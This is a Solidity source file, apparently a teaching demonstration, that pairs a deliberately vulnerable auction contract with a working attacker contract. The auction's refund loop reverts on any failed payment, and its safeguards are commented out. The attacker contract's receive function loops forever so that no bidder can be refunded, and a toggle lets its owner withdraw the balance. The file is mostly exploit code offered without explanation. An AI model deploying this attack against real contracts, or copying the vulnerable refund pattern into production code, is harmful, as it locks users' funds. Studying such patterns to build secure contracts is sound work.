// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDosAuction {
    function bid() external payable;

    function refund() external;
}

contract DosAuction is IDosAuction {
    mapping(address => uint) public bidders;

    address[] public allbidders;
    uint public refundProgress;

    function bid() external payable {
        //require(msg.sender.code.length == 0, "no contracts allowed");
        bidders[msg.sender] += msg.value;
        allbidders.push(msg.sender);
    }

    function refund() external {
        for (uint i = refundProgress; i < allbidders.length; i++) {
            address bidder = allbidders[i];

            (bool success, ) = bidder.call{value: bidders[bidder]}("");
            // if(!success) {
            //     failedRefunds.push(bidder);
            // }

            require(success, "failed to refund bidder");

            refundProgress++;
        }
    }
}

contract DosAttack {
    IDosAuction auction;
    bool hack = true;
    address payable owner;

    constructor(address _auction) {
        auction = IDosAuction(_auction);
        owner = payable(msg.sender);
    }

    function doBid() external payable {
        auction.bid{value: msg.value}();
    }

    function toggleHakc() external {
        hack = !hack;
    }

    receive() external payable {
        if (hack == true) {
            while (true) {}
        } else {
            owner.transfer(address(this).balance);
        }
    }
}
